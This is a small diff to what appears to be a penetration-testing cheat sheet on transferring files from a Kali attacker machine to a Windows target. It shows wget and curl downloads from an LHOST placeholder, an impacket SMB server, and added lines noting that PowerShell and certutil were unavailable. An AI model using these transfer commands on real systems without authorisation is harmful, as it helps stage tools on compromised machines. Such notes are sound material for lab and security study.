@@ -482,10 +482,13 @@ wget http://lhost/file
 curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```
 
-### Windows to Kali
+### kali to Windows
+- I saw the situation, Powershell not opening so we can't try the iwr
+- In cmd certutil not found
 
 ```powershell
 kali> impacket-smbserver -smb2support <sharename> .
+net view \\KaliIP
 win> copy file \\KaliIP\sharename
 ```
 
